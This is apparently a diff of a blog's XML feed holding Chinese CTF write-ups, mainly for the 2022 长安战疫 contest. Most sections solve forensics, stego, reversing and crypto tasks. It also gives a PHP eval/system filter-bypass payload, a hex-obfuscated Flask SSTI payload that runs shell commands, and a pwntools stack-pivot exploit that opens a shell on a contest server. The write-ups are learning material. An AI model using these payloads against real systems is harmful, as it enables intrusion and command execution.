-<p><span style="font-size: 12pt">拼了好久一段时间 最后总算是拼完了</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/ab6f7bfd926b8663ba911e8aa60febe7.png"></span></p>
-<p><span style="font-size: 12pt">FLAG值：cazy{make_XiAn_great_Again}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">附gaps做法：</span></p>
-<p><span style="font-size: 12pt">先用montage将小图结合到大图里去</span></p>
-<p><span style="font-size: 12pt;font-family: unset">magick montage *.png -geometry +0+0 flag.jpg</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f1bc333565ab8a1a695041cba5912d4e.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt;font-family: unset">将得到的大图 用gaps自动拼接</span></p>
-<p><span style="font-size: 16px;letter-spacing: normal;text-indent: 0px;text-transform: none;, sans-serif, SimHei, SimSun">gaps –image&#x3D;flag.jpg –generations&#x3D;40 –population&#x3D;120 –size&#x3D;100 –save</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/640583a7ba2b69175c7a4d334f2a66af.png"></span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/e6c54e9aa48d0c8c877bd8c3a687e5de.png"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目六朴实无华的取证</span></span></p>
-<p><span style="font-size: 12pt">这是一道为数不多的内存取证题目，题目给了我们一个xp_sp3.raw内存文件。我们就用volatility对其进行分析。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/3e86f4a4295d7eb0a9b90212a8eea71b.png"></span></p>
-<p><span style="font-size: 12pt">查看系统基本信息之后，我们可以确定他的系统版本信息为WinXPSP2x86。根据内存取证的做题手法，对内存中正在运行的进程列出进行分析。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/67fd4d2d372677709d8d374ef327e4bb.png"></span></p>
-<p><span style="font-size: 12pt">我们发现内存中运行着notepad.exe。我们就用 notepad 插件对notepad中的内容进行提取。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/40872828e21bdab52ca00f636bdaf3ab.png"></span></p>
-<p><span style="font-size: 12pt">发现记事本中存在信息 20211209(encrypt)，之后我们对系统中可能存在的有关答案的文件进行列出并提取。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/647999130fa70121dbb9ded1f6478add.png"></span></p>
-<p><span style="font-size: 12pt">我们可以发现存在flag.zip flag.png。将文件提取出来之后，发现压缩包需要解压密码，那么我们将刚才从记事本中得到的密码对其进行解压。然后我们得到了一个类似于加密的记事本内容。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/c21596cfe19e30b5625bf41f46a961c3.png"></span></p>
-<p><span style="font-size: 12pt">然后得到了一张png图片，实际上是BMP图片。图片中告诉了我们一个大概的FLAG</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/150e6ca8c79320b2098a2bd0bb780880.png"></span></p>
-<p><span style="font-size: 12pt">然后根据加密脚本，对其进行解密，加密脚本的大致原理应该是一个凯撒加密。并且偏移量为3位。我们对其进行大概的解密后发现，FLAG并不是正确的。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/0162ecb7515346a72fc23c3e3569d4a0.png"></span></p>
-<p><span style="font-size: 12pt">我们知道，在凯撒加密中，特殊字符和数字并不能被正确的加密或者解密，所以根据加密脚本，我们将数字的ACSII码向后位移32位之后，并且根据做题习惯将？改为_，便可以得到正确的flag</span></p>
-<p><span style="font-size: 12pt">FLAG值：cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目七RCE_No_Para</span></span></p>
-<p><span style="font-size: 12pt">这道题，就是一道需要通过PHP各种参数进行Bypass绕过的题目。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/67d78e10e7407b026028c22f1ac7eb7e.png"></span></p>
-<p><span style="font-size: 12pt">分析题目之后，发现题目通过正则表达式，将匹配到的文件替换为空，并且对 session</span></p>
-<p><span style="font-size: 12pt">end next header dir 字样进行检测，如果检测到了便返回 “Hacker!”</span></p>
-<p><span style="font-size: 12pt">既然会对code中函数进行检测，那么我们就用别的参数进行传参，并且对code进行注释。</span></p>
-<p><span style="font-size: 12pt">构造Payload来获取目录下的文件:</span></p>
-<p><span style="font-size: 12pt">?1551&#x3D;system(%27cat%20flag.php%27);&#x2F;&#x2F;&amp;code&#x3D;eval(implode(reset(get_defined_vars())));</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/1e9ca09f96d9a6225c7664c5c1905d3e.png"></span></p>
-<p><span style="font-size: 12pt">构造Payload来获得flag：</span></p>
-<p><span style="font-size: 12pt">?1551&#x3D;system(%27cat%20flag.php%27);&#x2F;&#x2F;&amp;code&#x3D;eval(implode(reset(get_defined_vars())));</span></p>
-<p><span style="font-size: 12pt">在F12中得到flag值。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8ca1178d16305918fd8dfff23bc8c6de.png"></span></p>
-<p><span style="font-size: 12pt">FLAG值：flag{94e3bd90859dba7c2cb9f47865947370}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目八flask</span></span></p>
-<p><span style="font-size: 12pt">进入题目，我们打开F12打开发现前端存在判断，仔细观察函数requests已经if语句格式，结合题目 flask，我们推断出来这是一道SSTI注入题目。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/830a55042e409db0ac9fb73c14ed4f59.png"></span></p>
-<p><span style="font-size: 12pt">然后题目要求url的结尾必须以.js结尾。所以我们可以构造一个注入语句来判读框架。</span></p>
-<p><span style="font-size: 12pt">&#x2F;admin?name&#x3D;49&amp;a&#x3D;.js?</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/842121dcff69a9191fa9fdbb752585aa.png"></span></p>
-<p><span style="font-size: 12pt">果然，不出所料，这道题目属于 Flask SSTI 模板注入，在对网页后端的WAF进行爆破后，我们发现我们常用的__globlas__，__init__，等寻常的函数都被WAF了。</span></p>
-<p><span style="font-size: 12pt">但是我们可以用另一种方法，那就是利用python内置的attr函数啦进行十六进制转字符串并且执行函数，用()来代替[]，用attr来实现函数功能。</span></p>
-<p><span style="font-size: 12pt">Payload:</span></p>
-<p><span style="font-size: 12pt">admin?name&#x3D;<code>&#123;&#123;(test'attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")'attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")'attr("\x67\x65\x74")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")'attr("\x67\x65\x74")("\x65\x76\x61\x6c")("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x70\x6f\x70\x65\x6e\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x22\x29\x2e\x72\x65\x61\x64\x28\x29"))&#125;&#125;</code>&amp;a&#x3D;.js?</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f6ba48331044c5b78c21aa29f36c4f77.png"></span></p>
-<p><span style="font-size: 12pt">然后就可以得到flag。</span></p>
-<p><span style="font-size: 12pt">FLAG值：flag{81ede5b11793556e2f311b010ed3b34b}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目九cute_doge</span></span></p>
-<p><span style="font-size: 12pt">作为一个逆向狗，无论什么exe都想点一点。看到题目，我们打开之后，并没有特别的提示，只有一只 cute_doge</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/0a25db44ee0936ca0f0795535ff8e30b.png"></span></p>
-<p><span style="font-size: 12pt">并且在点击图片（按钮）之后会提示”我说flag在这里，你信吗？”字样。于是我们按照惯例，对软件进行分析。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/5f4cda3935c6d23dba59e339ea9a1f30.png"></span></p>
-<p><span style="font-size: 12pt">在确定是64位系统软件之后，我们就可以使用IDA来对软件进行静态分析。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8661391b8928b1e9fa4841ce2618a194.png"></span></p>
-<p><span style="font-size: 12pt">在对软件内的字符串进行从上到下的分析时，我们发现有一串类似于base64加密的字符串，别问，问就是杂项手的第六感。</span></p>
-<p><span style="font-size: 12pt">果不其然，在解密后我们得到flag</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/7fd7d939785c59a979f5a785d2c85d79.png"></span></p>
-<p><span style="font-size: 12pt">FLAG值：flag{Ch1na_yyds_cazy}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十无字天书</span></span></p>
-<p><span style="font-size: 12pt">这道题目属实有一点偏门，但是身为一个杂项人，搜索能力当然是最重要的。</span></p>
-<p><span style="font-size: 12pt">题目给了我们一个 key.ws 和一个 flag.txt，其中的内容都是有空格 连接符 - 和 Tab号组成的密文，观察 flag.txt ，发现明显是由 snow 加密过后的 flag</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/cc10d9e3874ca1c91f3793263b0e374a.png"></span></p>
-<p><span style="font-size: 12pt">但是解密 snow 需要密钥，那么我们在看到 key.ws 只有空格和连接号和Tab组成并且没有明显的分隔符，那么经过一番搜索，最后确定了是 white-space 隐写。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/164c8e881900b0babe60fa0770d9b833.png"></span></p>
-<p><span style="font-size: 12pt">我们成功拿到Key之后，就可以用Snow 解密工具对flag进行解密了。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/ecde1ebcf8b25784e7f661d4e89bfd64.png"></span></p>
-<p><span style="font-size: 12pt">FLAG值：cazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十一 binary</span></span></p>
-<p><span style="font-size: 12pt">这道题目给了我们一个234文件，在我们不清楚文件类型的情况下，我们可以使用Winhex来分析文件的文件头，从而确定文件的文件类型。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f9841613d266c80e04e81595d561e074.png"></span></p>
-<p><span style="font-size: 12pt">通过分析文件头 CAFEBABE 我们可以知道这是一个 java 的 .class 文件，知道文件类型之后，我们就可以对文件进行反编译了。我的做法是直接扔到 IDEA 里面进行反编译。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/5b859d438d5391c3dadbf22fefb1bdb8.png"></span></p>
-<p><span style="font-size: 12pt">分析文件后，我们发现主函数 Main 下有一个数组，且里面的字符很像我们日常使用的ACSII编码。我们将字符进行提取并且解码。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/e2f17bdf46a84a9e7a82ac0be1a29f1b.png"></span></p>
-<p><span style="font-size: 12pt">得到文件后，熟悉Base64的CTFer就知道是0和1的编码了。放到在线网站base64.us种解密后得到我们所需要的数据。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/d6d981dd43ba4bcdd55cb84be9521841.png"></span></p>
-<p><span style="font-size: 12pt">解码后，我们发现这是由一个一组由37个数据并且分37组所组成的二进制，当我们将二进制分行显示时，便发现二进制的排序从某种角度来说很像二进制。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f8357e39f1747ed98a932706d2b4c50a.png"></span></p>
-<p><span style="font-size: 12pt">为了验证我们的猜想，我们将1替换为白色方格，将0替换为黑色方格。然后显示字符串。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/6251860405b1f6eef69d5eb0fd3243c8.png"></span></p>
-<p><span style="font-size: 12pt">所幸，我们的猜想是正确的，通过扫描二维码我们也是成功的获取到了flag。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/36e3ec34fd4b9fd1354a7b3c2c316e3e.png"></span></p>
-<p><span style="font-size: 12pt">FLAG值：flag{932b2c0070e4897ea7df0190dbf36ece}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十二 hello_py</span></span></p>
-<p><span style="font-size: 12pt">这道题目，我们直接利用在线的pyc转py的网站，将题目所给的pyc文件转为可读的py文件。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/d8b79a99a870700c13ed3fb197b2d547.png"></span></p>
-<p><span style="font-size: 12pt">根据python文件所给的整体逻辑，我们分析题目需要我们输入一个flag，然后进行加密，对已经加密过的Happy数列进行比较。</span></p>
-<p><span style="font-size: 12pt">然后我们发现存在两个加密函数 encode_1 和 encode_2 ，但是他们并不是一起工作的，而是有线程 t1 先启动，然后线程 t2 再启动。组成一个双加密。</span></p>
-<p><span style="font-size: 12pt">分析 encode_1 函数，是将 flag 于 奇数位进行异或加密， encode_2 函数则是于 偶数位进行异或加密。注意他们的加密方式虽然相同但是加密的偏移量不同。</span></p>
-<p><span style="font-size: 12pt">然后我们就可以逆向推导出解密过程。</span></p>
-<pre><code>(chr(112 ^ 9) + chr(10 ^ 112) + chr(102 ^ 7) + chr(5 ^ 102) + chr(90 ^ 5) + chr(106 ^ 90) + chr(50 ^ 3) + chr(3 ^ 50) + chr(100 ^ 1) + chr(44 ^ 100))[::-1]
-=&gt;&#39;He110_cazy&#39;
-</code></pre>
-<p><span style="font-size: 12pt">FLAG值: He110_cazy</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十三 Ez_Steg</span></span></p>
-<p><span style="font-size: 12pt">题目附件如下：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/6f2f68a0c9db654995cf427f726539a9.png"></span></p>
-<p><span style="font-size: 12pt">压缩包提示说密码是6位数字</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">直接用bandizip自带的密码破解 很快啊，只要一秒啊</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/9988674343f624fb3fdf3aa522106fbd.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">得到密码为220101</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">解压成功后 得到emjio.txt 和一个pyc文件</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">先看emoji密码</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/e02ac7c0765c7784de182e88c0e38c83.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">先试了试base100 无果，题目还给了一个pyc 需要密钥的emoji加密 猜想到了emoji-aes加密</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">再看pyc文件 我第一时间是将其反编译uncompyle6 -o key.py steg.pyc</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">Python文件如下：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8fc5f238ff31b8a0ba35d6dac93a811a.png"></span></p>
-<p><span style="font-size: 12pt">这里我卡了很久 这程序跟我们要的密钥也没关系呀。。所以我这边就放了放 后面突然想起来了pyc也能作为一种隐写。</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">这里是剑龙隐写Stegosaurus 脚本github可下</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">Python stegosaurus.py -x steg.pyc</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/55849d2b4b0bcf4e6b83e44b584f0a53.png"></span></p>
-<p><span style="font-size: 12pt">得到了key St3g1sV3ryFuNny</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">最后用emoji-aes解码 一把梭！ <a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/860c2949a1231e695806d4f3ad7064fd.png"></span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/043bb194a2d11c928007f4e35de6dc72.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">FLAG值: cazy{Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十四 no_math_no_cry</span></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">这道题目比较小，所以我们直接来看 sec_encry(m) 这个函数。c 是该函数加密flag后得到的值</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/680e543368777f60de4aabca224c4ec7.png"></span></p>
-<p><span style="font-size: 12pt">根据他的加密过程，我们可以反向推导解密脚本，但是我们在编写脚本的时候要注意，因为他限制了flag的长度不能超过80，那么经过bytes_to_long变成数字的flag 再减去 1&lt;&lt;500(3273390607896141870013189696827599152216642046043064789483291368096133796404674554883270092325904157150886684127560071009217256545885393053328527589376)之后，很有可能是负数。而负数的平方又是正数。以下是解密脚本</span></p>
-<pre><code>#!/usr/bin/python3
-from gmpy2 import iroot
-from Crypto.Util.number import long_to_bytes as l2b
-c = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169
-c1 = c - 0x0338470
-c2 = iroot(c1,2)[0]
-c3 = -c2 + (1&lt;&lt;500)
-print(l2b(c3))
-=&gt;b&#39;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#39;
-</code></pre>
-<p><span style="font-size: 12pt">FLAG值:cazy{1234567890_no_m4th_n0_cRy}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十五 pwn1</span></span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8e02a4f8cf367f22b54e038dd6f2b642.png"></span></p>
-<p><span style="font-size: 12pt">32位程序 IDA分析：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/64508def49525b4a2ec64f5b77e32e08.png"></span></p>
-<p><span style="font-size: 12pt">显然的栈溢出 shift+f12 看字符串 发现还给了后门：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/051ca26752a1c909dae8af94b1c1d4d9.png"></span></p>
-<p><span style="font-size: 12pt">这道本让我以为很简单的题目我却做了很久 栈溢出 后门，没想到不是那么简单</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">（原本的payload）</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/27c918385f7f686feb43484ebb711d71.png"></span></p>
-<p><span style="font-size: 12pt">结果没打通</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/1bdf017a6c4d6dfd731932c1bb069672.png"></span></p>
-<p><span style="font-size: 12pt">后来搞了很久 想了一下题目还给了buf的地址 再看汇编</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/d1096f7b385d545c202793da1b3ab415.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">那么是不是可以把&#x2F;bin&#x2F;sh写进buf的地址 然后把地址覆盖 最后拿到shell</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">实际上我们要找到binsh的地址 然后再填充一些垃圾字符 最后再将buf的地址覆盖 因为最后lea那里减去了4 所以最后还要补一个+4</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">其实不是栈溢出 而是栈迁移。</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">先用接受buf的地址</span></p>
-<pre><code>r.recvuntil(&#39;Gift:&#39;)
-bufaddr = eval(r.recv().strip())
-</code></pre>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/86c95cabef33c02886335337d034d9a7.png"></span></p>
-<p><span style="font-size: 12pt">这里找到后门地址为0x8048540</span></p>
-<p><span style="font-size: 12pt">所以最终payload是</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<pre><code>payload = p32(binsh_addr) + b&#39;a&#39;*48 + p32(bufaddr+4)
-</code></pre>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/4d13f597302f03fc6d0601321dcd189e.png"></span></p>
-<p><span style="font-size: 12pt">打通：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/96b58404f4de909b040ef757afc1beb1.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<pre><code>from pwn import *
-
-context.log_level=&#39;debug&#39;
-r = remote(&#39;113.201.14.253&#39;,16088)
-r.recvuntil(&#39;Gift:&#39;)
-bufaddr = eval(r.recv().strip())
-print(&#39;[+]%s&#39;%hex(bufaddr))
-binsh_addr = 0x08048540
-payload = p32(binsh_addr) + b&#39;a&#39;*48 + p32(bufaddr+4)
-r.sendline(payload)
-r.interactive()
-</code></pre>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">FLAG值：flag{474b7f9219effe69530da4ad63c1752a}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十六LinearEquations</span></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">拿到题目之后。通过观察题目。我们可以发现题目主要分为3大块，第一块就是开头的限制函数 assert，通过这里我们可以得到很多信息。比如flag的长度为24位。</span></p>
-<p><span style="font-size: 12pt">第二块就是主要的加密块了，我们可以发现通过 <strong>init</strong>() 来初始化 class类，并且传递了两个值，就是 seed1 和 seed2，并且将flag 分为了3份，由 flag[:8] flag[8:16] flag[16:]组成，每一部分8个字符。并且8个字符转为数字后不能比n大。</span></p>
-<p><span style="font-size: 12pt">第三块就是我们的主进程了。进程通过getRandomInteger(64)来向函数中传递了两个seed的值。并且返回了由 my_LCG().next()中产生的5个seed。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/98d8a09a5f6bef6a4b0d2f12d00e5069.png"></span></p>
-<p><span style="font-size: 12pt">由函数推理得知，seed3是由 seed1 和 seed2 推导产生。</span></p>
-<p><span style="font-size: 12pt">具体的方程为 (flag1 * seed2 + flag2 * seed1 + flag3) % n</span></p>
-<p><span style="font-size: 12pt">由此，我们可以推导出三条方程，结合题目的意思，就是线性方程组。</span></p>
-<pre><code>flag1 * seed4 + flag2 * seed3 + flag3 mode n = seed5
-flag1 * seed5 + flag2 * seed4 + flag3 mode n = seed6
-flag1 * seed6 + flag2 * seed5 + flag3 mode n = seed7
-</code></pre>
-<p><span style="font-size: 12pt">由此我们可以联立线性方程组，最后推出答案。</span></p>
-<pre><code>flag1 = 5490290802446982981
-flag2 = 8175498372211240502
-flag3 = 6859390560180138873
-</code></pre>
-<p><span style="font-size: 12pt">最后将flag转为字符串即可</span></p>
-<p><span style="font-size: 12pt">FLAG值：cazy{L1near_Equ4t1on6_1s_34sy}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-]]></content>
-      <categories>
-        <category>刷题笔记</category>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>刷题</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>融贯杯 writeup</title>
     <url>/2021/12/08/20211208/</url>
-    <content><![CDATA[<p><span style="font-size: 18pt">学长闲的没事干 给学弟出题 顺便给外校人员也做做 就诞生了本次的融贯杯</span></p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><span style="font-size: 18pt">学长闲的没事干 给学弟出题 顺便给外校人员也做做 就诞生了本次的融贯杯</span></p>
 <p><span style="font-size: 18pt"></span></p>
 <p><span style="font-size: 18pt">然后我被拉过来出题 出了19道web和9道misc 写下我的解题思路</span></p>
 <p><span style="font-size: 18pt"></span></p>
@@ -1705,7 +1314,7 @@ decode()
   <entry>
     <title>摸鱼大闯关 1-40关 writeup</title>
     <url>/2021/12/04/20211204/</url>
-    <content><![CDATA[<p>昨天玩了下摸鱼大闯关 一共54关 目前是40关</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>昨天玩了下摸鱼大闯关 一共54关 目前是40关</p>
 <p>网站是<a href="https://p.hancel.org/">https://p.hancel.org/</a> 题目质量可以 烧脑。解了一天就写个writeup吧</p>
 <p>内容偏ctf吧，前期是前端 后面就是烧脑的图片、编码。。</p>
 <p>writeup只提供思路 不提供url。有关的地方会打码。</p>
@@ -2065,6 +1674,402 @@ decode()
       <tags>
         <tag>刷题</tag>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022长安战&quot;疫&quot;WriteUp</title>
+    <url>/2022/01/09/20220109/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script>
+			<script>
+				console.error("SyntaxError: Unexpected token / in JSON at position 48");
+			</script>
+
+<p><span style="font-size: 12pt">前言&gt;</span></p>
+<p><span style="font-size: 10pt;font-style: italic">“</span> <span style="letter-spacing: normal;text-indent: 32px;text-transform: none;font-size: 10pt;font-style: italic">他们以”逆行”的姿态为我们筑起一道坚固的”防护墙”，他们在打一场没有硝烟的疫情战，是一条永无退路并且必胜阻击战。他们，就是这个时代的最美逆行者。</span><span style="font-size: 10pt;font-style: italic">“–致所有疫情工作者</span></p>
+<p>2022年疫情再起 作为南方人也希望疫情能好转， 为西安同时也为天津、郑州等加油 希望他们能挺过这次难关！</p>
+<p>疫情期间网络安全意识需提升 便诞生了本次比赛。</p>
+<p>此次比赛由600多名选手参加 我们队伍也是有幸排到了第17名 师傅们都太卷了 将近30道题都要AK了 tql</p>
+<p><img src="/uploads/2022/01/5fcab21eff6da6241a5c4abff460ba4f.png"></p>
+<p>这次难度还算比较友好，大多数题目都能做也不至于爆0，所以做的过程还是挺舒坦的。</p>
+<p>证书是前50%就能拿到的，尽管是这样师傅们也没放弃做题，这种做题的精神是提倡和支持的，比赛最重要的就是竞技精神。</p>
+<p>以下分享由我和另一位师傅HuMoLix 组成战队0x04的解题思路</p>
+<p><span style="font-size: 12pt">解题思路&gt;</span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目一八卦迷宫</span></span></p>
+<p><span style="font-size: 12pt">题目附件如下：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/681df6392af383881eddadc4a4d5cf62.png"></span></p>
+<p><span style="font-size: 12pt">走迷宫 再把路过的格子对应的字填入即可</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/38747c3e8ec898313c161f24cdf2f6c0.png"></span></p>
+<p><span style="font-size: 12pt">用画图画了下</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">然后对应了一下 最后flag为</span></p>
+<p><span style="font-size: 12pt">cazy{zhan chang yang chang zhan yang he chang shan shan an zhan yi yi zhan yi an yi chang an yang}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">FLAG值：cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目二no_cry_no_can</span></span></p>
+<p><span style="font-size: 12pt">拿到题目后，我们分析题目得知，主要是由 can_encrypt(flag,key) 函数对flag进行加密</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/ebb5bc0625f2fc6de5f592a8bc8a24a3.png"></span></p>
+<p><span style="font-size: 12pt">通过分析函数，我们可以发现，它是将加密系数 key 进行重组，实际上是将一个key变为多个key 例如 (key: “skip” &#x3D;&gt; new_key: “skipskipskipskip”)知道new_key的长度大于或等于flag，然后再将new_key中的单一字符串于flag中的单一字符串进行异或加密，这类似于古典密码学中的维吉尼亚加密。</span></p>
+<p><span style="font-size: 12pt">由于我们知道flag的前五位是由 cazy{ 组成，那么我们就可以通过密文来回退 key了，因为 key的长度 小于等于 5。</span></p>
+<p><span style="font-size: 12pt">我们可以通过list()函数来将bytes值转为ASCII数组之后进行异或操作。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/3b449eb558ad954ec1a8639c4a7e2481.png"></span></p>
+<p><span style="font-size: 12pt">我们可以根据异或的特性 a ^ b &#x3D; c ，c ^ b &#x3D; a来回推我们的key</span></p>
+<p><span style="font-size: 12pt">key &#x3D; [60 ^ ord(&amp;apos;c&amp;apos;), 112 ^ ord(&amp;apos;a&amp;apos;), 72 ^ ord(&amp;apos;z&amp;apos;), 134 ^ ord(&amp;apos;y&amp;apos;), 26 ^ ord(&amp;apos;{&amp;apos;)]</span></p>
